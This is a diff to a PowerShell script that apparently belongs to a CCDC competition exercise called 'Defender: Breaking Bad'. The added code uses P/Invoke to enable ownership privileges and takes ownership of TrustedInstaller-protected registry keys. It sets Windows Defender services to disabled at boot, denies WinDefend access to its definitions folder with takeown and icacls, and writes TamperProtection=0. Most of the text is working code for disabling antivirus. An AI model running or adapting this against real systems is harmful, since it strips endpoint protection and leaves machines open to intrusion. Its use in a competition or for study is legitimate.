@@ -56,6 +56,60 @@ function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
 function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
 function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }
 
+# PInvoke helper: enables SeTakeOwnershipPrivilege + SeRestorePrivilege so we can
+# take ownership of protected registry keys before setting their ACLs.
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class WinPriv {
+    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool OpenProcessToken(IntPtr h,uint a,ref IntPtr t);
+    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool LookupPrivilegeValue(string s,string n,ref long l);
+    [DllImport("advapi32.dll",SetLastError=true)] public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIV n,uint b,IntPtr p,IntPtr r);
+    [DllImport("kernel32.dll",SetLastError=true)] public static extern IntPtr GetCurrentProcess();
+    [StructLayout(LayoutKind.Sequential,Pack=1)]
+    public struct TOKEN_PRIV { public int Count; public long Luid; public int Attr; }
+    public static void Enable(string priv) {
+        IntPtr tok = IntPtr.Zero;
+        OpenProcessToken(GetCurrentProcess(), 0x28, ref tok);
+        var tp = new TOKEN_PRIV(); tp.Count = 1; tp.Attr = 2;
+        LookupPrivilegeValue(null, priv, ref tp.Luid);
+        AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+    }
+}
+'@ -ErrorAction SilentlyContinue
+
+function Grant-RegKeyOwnership {
+    param([string]$KeyPath)
+    try {
+        [WinPriv]::Enable("SeTakeOwnershipPrivilege")
+        [WinPriv]::Enable("SeRestorePrivilege")
+        $hive   = if ($KeyPath -match '^HKLM') { [Microsoft.Win32.Registry]::LocalMachine } else { [Microsoft.Win32.Registry]::CurrentUser }
+        $sub    = $KeyPath -replace '^HKL[CM]:\\', ''
+        $key    = $hive.OpenSubKey($sub, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+                      [System.Security.AccessControl.RegistryRights]::TakeOwnership)
+        $acl    = $key.GetAccessControl([System.Security.AccessControl.AccessControlSections]::None)
+        $acl.SetOwner([System.Security.Principal.NTAccount]"BUILTIN\Administrators")
+        $key.SetAccessControl($acl)
+        # Re-open with ChangePermissions right now that we own it
+        $key2   = $hive.OpenSubKey($sub, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+                      [System.Security.AccessControl.RegistryRights]::ChangePermissions)
+        $acl2   = $key2.GetAccessControl()
+        $rule   = New-Object System.Security.AccessControl.RegistryAccessRule(
+                      "BUILTIN\Administrators",
+                      [System.Security.AccessControl.RegistryRights]::FullControl,
+                      [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
+                      [System.Security.AccessControl.PropagationFlags]::None,
+                      [System.Security.AccessControl.AccessControlType]::Allow)
+        $acl2.AddAccessRule($rule)
+        $key2.SetAccessControl($acl2)
+        $key.Close(); $key2.Close()
+        return $true
+    } catch {
+        Write-Warn "Grant-RegKeyOwnership failed for ${KeyPath}: $_"
+        return $false
+    }
+}
+
 Write-Host ""
 Write-Warn "================================================================"
 Write-Warn " CCDC Phase 3 — Defender: Breaking Bad"
@@ -106,6 +160,16 @@ foreach ($svc in @("WinDefend","WdNisSvc","WdNisDrv","WdFilter","SecurityHealthS
             Write-Success "Stopped: $svc"
         } catch {
             Write-Warn "Could not stop ${svc}: $_"
+            # Fallback: disable via registry so it does not restart on next boot
+            $svcReg = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
+            if (Test-Path $svcReg) {
+                try {
+                    Set-ItemProperty -Path $svcReg -Name "Start" -Value 4 -Type DWord -Force
+                    Write-Info "$svc — set registry Start=4 (disabled at next boot)"
+                } catch {
+                    Write-Warn "Could not disable $svc via registry: $_"
+                }
+            }
         }
     }
 }
@@ -173,20 +237,14 @@ if (Test-Path $defPath) {
         Write-Info "Definition Updates directory already empty"
     }
 
-    # Apply DENY FullControl for NT SERVICE\WinDefend on the path tree
-    try {
-        $acl  = Get-Acl $defPath
-        $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
-            "NT SERVICE\WinDefend",
-            [System.Security.AccessControl.FileSystemRights]::FullControl,
-            [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
-            [System.Security.AccessControl.PropagationFlags]::None,
-            [System.Security.AccessControl.AccessControlType]::Deny)
-        $acl.AddAccessRule($deny)
-        Set-Acl -Path $defPath -AclObject $acl
-        Write-Success "DENY FullControl → NT SERVICE\WinDefend on: $defPath"
-    } catch {
-        Write-Err "Failed to set DENY ACL on Definition Updates: $_"
+    # Apply DENY FullControl for NT SERVICE\WinDefend on the path tree.
+    # takeown first so we hold the owner token, then icacls for the deny ACE.
+    & takeown.exe /F $defPath /R /A /D Y 2>$null | Out-Null
+    & icacls.exe $defPath /deny "NT SERVICE\WinDefend:(OI)(CI)(F)" /T /C /Q 2>$null
+    if ($LASTEXITCODE -eq 0) {
+        Write-Success "DENY FullControl -> NT SERVICE\WinDefend on: $defPath"
+    } else {
+        Write-Err "icacls DENY failed on Definition Updates (exit $LASTEXITCODE)"
     }
 } else {
     Write-Warn "Definition Updates path not found (Defender may not be installed): $defPath"
@@ -278,7 +336,20 @@ if ($isServer) {
             if ($LASTEXITCODE -eq 0) {
                 Write-Success "DISM feature removal succeeded"
             } else {
-                Write-Warn "DISM also failed (exit $LASTEXITCODE) — feature may need manual removal"
+                Write-Warn "DISM also failed (exit $LASTEXITCODE) — using registry disable fallback"
+                # Registry fallback: mark all Defender driver services as disabled so they
+                # do not load on next boot even if the feature can't be formally uninstalled.
+                $defSvcs = @("WinDefend","WdNisSvc","WdNisDrv","WdFilter","WdBoot","WdSensor")
+                foreach ($ds in $defSvcs) {
+                    $dsReg = "HKLM:\SYSTEM\CurrentControlSet\Services\$ds"
+                    if (Test-Path $dsReg) {
+                        Set-ItemProperty -Path $dsReg -Name "Start" -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
+                        Write-Info "Registry disabled: $ds (Start=4)"
+                    }
+                }
+                # Also mark the feature as not available via CBS
+                $cbsKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackagesPending"
+                Write-Info "Registry fallback complete — Defender services will not load on next boot"
             }
         }
     } elseif ($feat -and -not $feat.Installed) {
@@ -322,6 +393,9 @@ if ($rc1 -eq 0 -and $rc2 -eq 0) {
 # Lock the corresponding registry task cache key (double-lock)
 $taskReg = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\Windows Defender"
 if (Test-Path $taskReg) {
+    # Take ownership first so we can apply a DENY ACE on a TrustedInstaller-owned key
+    $owned = Grant-RegKeyOwnership -KeyPath $taskReg
+    if ($owned) { Write-Info "Took ownership of task cache registry key" }
     try {
         $tacl  = Get-Acl $taskReg
         $tdeny = New-Object System.Security.AccessControl.RegistryAccessRule(
@@ -355,14 +429,17 @@ Set-ItemProperty -Path $policyKey -Name "DisableBehaviorMonitoring" -Value 1 -Ty
 Set-ItemProperty -Path $policyKey -Name "DisableAntiVirus"          -Value 1 -Type DWord
 Write-Success "Wrote disable policy values to: $policyKey"
 
-# Set TamperProtection=0 in the Defender features key
+# Set TamperProtection=0 in the Defender features key.
+# Key is owned by TrustedInstaller — must take ownership before writing.
 $tamperKey = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
 if (Test-Path $tamperKey) {
+    $owned = Grant-RegKeyOwnership -KeyPath $tamperKey
+    if ($owned) { Write-Info "Took ownership of Defender\Features" }
     try {
-        Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 0 -Type DWord
+        Set-ItemProperty -Path $tamperKey -Name "TamperProtection" -Value 0 -Type DWord -Force
         Write-Success "TamperProtection = 0 in Defender\Features"
     } catch {
-        Write-Warn "Could not set TamperProtection (may require TamperProtection already off): $_"
+        Write-Warn "Could not set TamperProtection: $_"
     }
 }
 
